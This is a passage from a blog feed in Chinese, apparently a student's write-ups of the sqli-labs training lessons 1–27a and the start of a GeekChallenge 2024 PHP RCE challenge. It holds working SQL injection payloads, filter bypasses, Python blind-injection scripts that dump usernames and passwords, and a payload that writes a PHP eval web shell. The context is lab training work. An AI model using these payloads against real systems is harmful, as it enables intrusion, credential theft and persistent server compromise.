information_schema.schemata where 1=1 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="comment">-- less-26</span></span><br><span class="line"><span class="string">&#x27; union %0B select %0B 1,group_concat(COLUMN_name),database() %0B from %0B infoorrmation_schema.columns %0B where %0B TABLE_name=&#x27;</span>users<span class="string">&#x27; %0B || %0B &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>inf<del>or</del>mation_schema的or会被过滤，要改成info<del>or</del>rmation_schema</strong></p><h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>&#39;)闭合，注意后面也要改</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) %0B union %0B select %0B 1,group_concat(COLUMN_name),database() %0B from %0B infoorrmation_schema.columns %0B where %0B TABLE_name=&#x27;</span>users<span class="string">&#x27; %0B || %0B &#x27;</span><span class="number">1</span><span class="string">&#x27;=(&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>过滤select，selselselectectect中间插两次绕过了，<br>uniunionon这个只要插一次<br> # -- 空格也被过滤了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; %0B uniunionon %0B selselselectectect%0B 1,2,&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; %0B uniunionon %0B selselselectectect%0B 1,database(),&quot;<span class="number">3</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sqli </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs,less-11到22</title>
      <link href="/2024/11/22/%E5%AD%A6/sqli-labs/sqli-labs-less-11-22/"/>
      <url>/2024/11/22/%E5%AD%A6/sqli-labs/sqli-labs-less-11-22/</url>
      
        <content type="html"><![CDATA[<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2> <span id="more"></span><p>sql中&quot;-- &quot;、#、&#x2F;<strong>&#x2F;(必须有空格)代表注释<br>在url的get提交中使用&quot;--+&quot;或&quot;-- -&quot;确认已经加过空格，get提交--+时，+被php替换成空格<br>url中#号作为锚点，不当做数据来传输，可以用url编码后的#，%23(23是#ASCII码的16进制)<br>&#x2F;</strong>&#x2F;注释中间部分，可以代替空格</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11</span><span class="string">&#x27; union select 1,2#post提交，所以直接用#</span></span><br></pre></td></tr></table></figure><h3 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span>&quot;) union select 1,2#</span><br></pre></td></tr></table></figure><h2 id="less-13-post报错注入"><a href="#less-13-post报错注入" class="headerlink" title="less-13 post报错注入"></a>less-13 post报错注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;) and updatexml(1, SUBSTR(concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,  (select group_concat(table_name) from information_schema.tables where table_schema=database())  ),1,31), 3)#</span></span><br></pre></td></tr></table></figure><h3 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h3><p>13改双引号</p><h2 id="less-15-post布尔盲注"><a href="#less-15-post布尔盲注" class="headerlink" title="less-15 post布尔盲注"></a>less-15 post布尔盲注</h2><p><strong>假设不知道用户名，可以用 1&#39; or 1 and [条件] 注入短路and前面的判断</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst</span>(<span class="params">c,idx=<span class="number">0</span></span>):</span><br><span class="line">    idx=<span class="built_in">str</span>(idx)</span><br><span class="line">    url=<span class="string">&#x27;http://192.168.86.131/sqli-labs/Less-15/&#x27;</span></span><br><span class="line">    pl=<span class="string">&quot;1&#x27; or 1 and &quot;</span>  +<span class="built_in">str</span>(c)+  <span class="string">&quot;&gt; ASCII(SUBSTR((select group_concat(username,&#x27;-&#x27;,password) from users),&quot;</span>+idx+<span class="string">&quot;,1)) #&quot;</span></span><br><span class="line">    data=&#123;<span class="string">&#x27;uname&#x27;</span>:pl,<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">    res=requests.post(url=url,data=data)</span><br><span class="line">    <span class="comment">#print(res.text[1350:1400])</span></span><br><span class="line">    t=fnmatch.fnmatch(res.text,<span class="string">&#x27;*/images/flag*&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span>(t) <span class="keyword">else</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h3><p>15 改 1&quot;)</p><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>看源码得知，uname进行列过滤，但是passwd没有</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname:  admin </span><br><span class="line">passwd: <span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,  substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31)  ), 3)#</span></span><br></pre></td></tr></table></figure><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>uagent没有过滤，在User-Agent头里注入，hackbar修改头部再点execute，之后填写正确用户名和密码并提交可看到报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;)#报错注入使用and连接，用or连接不会回显报错</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="string">&#x27;~&#x27;</span>,  substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">31</span>)  ), <span class="number">3</span>)  ,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)#</span><br></pre></td></tr></table></figure><h3 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h3><p>在Referer头里注入,比18少一个参数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,  substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31)  ), 3) ,&#x27;</span><span class="number">1</span><span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>登陆后cookie了里存储uname:&quot;admin&quot;<br>修改admin为uname -1&#39; or id&#x3D;4;刷新返回id&#x3D;4的用户信息<br><img src="/images/%E5%AD%A6/sqli-labs/20.jpg" alt="试试图片" loading="lazy"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,3#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()#</span><br></pre></td></tr></table></figure><h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p>用&#39;)构造闭合,注入语句经base64编码存入cookie，若末尾的%3d是等于号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;) union select 1,2,3#</span></span><br><span class="line"><span class="string">LTEnKSB1bmlvbiBzZWxlY3QgMSwyLDMj</span></span><br></pre></td></tr></table></figure><h3 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&quot; union select 1,2,3#</span><br><span class="line">LTEiIHVuaW9uIHNlbGVjdCAxLDIsMyM=</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sqli </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs,less-1到10</title>
      <link href="/2024/11/20/%E5%AD%A6/sqli-labs/sqli-labs-less-1-10/"/>
      <url>/2024/11/20/%E5%AD%A6/sqli-labs/sqli-labs-less-1-10/</url>
      
        <content type="html"><![CDATA[<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2> <span id="more"></span><p>库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(schema_name),2 from information_schema.schemata;--+</span></span><br></pre></td></tr></table></figure><p>当前数据库 表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database();--+</span></span><br></pre></td></tr></table></figure><p>某个表的列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),2 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;;--+ 指定表</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name,<span class="string">&#x27;-&#x27;</span>,table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database();<span class="comment">--+当前库所有表和列</span></span><br></pre></td></tr></table></figure><h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><p>数字注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure><h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>; <span class="number">1</span>变成 <span class="string">&quot;1&quot;</span> </span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure><h2 id="less-5-报错注入"><a href="#less-5-报错注入" class="headerlink" title="less-5 报错注入"></a>less-5 报错注入</h2><p>EXTRACTVALUE(xml_target, xpath_expr)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,  (select 1)  ), 3) --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="string">&#x27;~&#x27;</span>,  (<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())  ), <span class="number">3</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>错误输出有长度限制，select 中加limit(IDX,1) 或substr( (select ...) ,IDX,31)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,  (select group_concat(table_name) from information_schema.tables where table_schema=database()) LIMIT(1,1)  ), 3) --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="string">&#x27;~&#x27;</span>,  substr(  (<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())  ,<span class="number">1</span>,<span class="number">31</span>)  ), <span class="number">3</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and updatexml(1, concat(0x7e,version()), 3) --+双引号 其他同5</span><br><span class="line">?id=1&quot; <span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="string">&#x27;~&#x27;</span>,substr( (<span class="keyword">select</span> group_concat(column_name,<span class="string">&#x27;-&#x27;</span>,table_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()) ,<span class="number">60</span>,<span class="number">31</span>) ), <span class="number">3</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>@@datadir获取数据库存储数据路径 ，@@basedir是MYSQL获取安装路径,可以去less1找，或者盲注<br>?id&#x3D;1&#39;)) and (select count(*) from mysql.user)&gt;0 --+ 如果返回正常则有读取权限<br>参考: <a href="https://blog.csdn.net/m0_46315342/article/details/106557552">参考</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&quot;&lt;?php @eval($_POST[&#x27;</span><span class="number">123</span><span class="string">&#x27;]);?&gt;&quot;,3 into outfile &quot;/var/www/html/sqli-labs-php7/Less-3/1.php&quot; -- +</span></span><br></pre></td></tr></table></figure><h2 id="less-8-布尔盲注"><a href="#less-8-布尔盲注" class="headerlink" title="less-8 布尔盲注"></a>less-8 布尔盲注</h2><p>用python的req查找</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">&quot;。。。Less-8/?id=&quot;</span>+<span class="string">&quot;1&#x27; and &#x27;&quot;</span>  +c+  <span class="string">&quot;&#x27;&gt; SUBSTR((select group_concat(username,&#x27;-&#x27;,password) from users),&quot;</span>+idx+<span class="string">&quot;,1);--+&quot;</span></span><br></pre></td></tr></table></figure><p>mysql不分大小写，用上面的方法返回的均是大写，可用ASCII()解决</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">f&quot;。。。Less-8/?id=1&#x27; and <span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>&gt; ASCII(SUBSTR((select group_concat(username,&#x27;-&#x27;,password) from users),<span class="subst">&#123;idx&#125;</span>,1));--+&quot;</span></span><br></pre></td></tr></table></figure><details><summary><font color='yellowgreen'>布尔盲注脚本(展开)</font></summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst</span>(<span class="params">c,idx=<span class="number">0</span></span>):</span><br><span class="line">    idx=<span class="built_in">str</span>(idx)</span><br><span class="line">    url=<span class="string">f&quot;http://192.168.86.131/sqli-labs/Less-8/?id=-1&#x27; and <span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>&gt; ASCII(SUBSTR((select group_concat(username,&#x27;-&#x27;,password) from users),<span class="subst">&#123;idx&#125;</span>,1));--+&quot;</span></span><br><span class="line">    res=requests.get(url) <span class="comment">#注入 c &gt; str切片(idx,1) #结果为真执行ret1         </span></span><br><span class="line">    t=fnmatch.fnmatch(res.text,<span class="string">&#x27;*You are in*&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span>(t) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">l,r,cmp,idx</span>): </span><br><span class="line">    p=r//<span class="number">2</span> - l</span><br><span class="line">    <span class="keyword">while</span>(r-l&gt;<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(cmp(<span class="built_in">chr</span>(p) , idx)):<span class="comment">#大于</span></span><br><span class="line">            r=p</span><br><span class="line">            p=p-(p-l)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=p</span><br><span class="line">            p=p+(r-p)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(l)</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    a+=find(<span class="number">0</span>,<span class="number">127</span>,cmptst,i)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure></details><h2 id="less-9-时间盲注"><a href="#less-9-时间盲注" class="headerlink" title="less-9 时间盲注"></a>less-9 时间盲注</h2><p>参考hello-ctf:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IF(<span class="keyword">condition</span>, value_if_true, value_if_false)</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> IF(SLEEP(<span class="number">5</span>),<span class="number">1</span>,<span class="number">0</span>) </span><br></pre></td></tr></table></figure><p>不存在用户名为 admin 的用户，那么该语句将会立即返回结束；否则，程序将会暂停 5 秒钟后再返回结果。  </p><p>less-8的 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span>x<span class="string">&#x27;&gt; ASCII(SUBSTR((select group_concat(username,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,password) from users),IDX,1));--+&quot;</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)<span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if((120&gt; ASCII(SUBSTR((select group_concat(username,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,password) from users),1,1))),sleep(5),0)--+</span></span><br></pre></td></tr></table></figure><p>改一下cmp函数就能用了</p><details><summary><font color='yellowgreen'>二分法时间盲注(展开)</font></summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst</span>(<span class="params">c,idx=<span class="number">0</span></span>):</span><br><span class="line">    idx=<span class="built_in">str</span>(idx)                                                                                                                                      </span><br><span class="line">    url=<span class="string">&quot;http://192.168.86.131/sqli-labs/Less-9/?id=1&#x27; &quot;</span>+<span class="string">&quot;and if((&quot;</span>+<span class="built_in">str</span>(c)+<span class="string">&quot;&gt; ASCII(SUBSTR( (select group_concat(username,&#x27;-&#x27;,password) from users) ,&quot;</span>+idx+<span class="string">&quot;,1))),sleep(1),0)--+&quot;</span></span><br><span class="line">    res_time=requests.get(url).elapsed.total_seconds()</span><br><span class="line">    <span class="comment">#print(res_time)#更改sleep时间大小</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span>(res_time&gt;<span class="number">1</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">l,r,cmp,idx</span>): </span><br><span class="line">    p=r//<span class="number">2</span> - l</span><br><span class="line">    <span class="keyword">while</span>(r-l&gt;<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(cmp(p , idx)):<span class="comment">#大于</span></span><br><span class="line">            r=p</span><br><span class="line">            p=p-(p-l)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=p</span><br><span class="line">            p=p+(r-p)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(l)</span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    a+=find(<span class="number">0</span>,<span class="number">127</span>,cmptst,i)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure></details><h3 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">&quot;。。。Less-10/?id=1\&quot; &quot;</span>+<span class="string">&quot;and if((&quot;</span>+<span class="built_in">str</span>(c)+<span class="string">&quot;&gt; ASCII(SUBSTR( (select group_concat(username,&#x27;-&#x27;,password) from users) ,&quot;</span>+idx+<span class="string">&quot;,1))),sleep(1),0)--+&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sqli </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE_ME</title>
      <link href="/2024/11/12/%E5%AD%A6/php_rce/rce_me/"/>
      <url>/2024/11/12/%E5%AD%A6/php_rce/rce_me/</url>
      
        <content type="html"><![CDATA[<h3 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE_ME"></a>RCE_ME</h3> <span id="more"></span><p>RCE_ME[即刻大挑战2024]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment"># Can you RCE me?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/start.*now/is&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>], <span class="string">&quot;start now&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Well, you haven&#x27;t started.&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to GeekChallenge2024!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">sha1</span>((<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>] != <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]))</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You took the first step!&lt;br&gt;&quot;</span>;</span><br><span 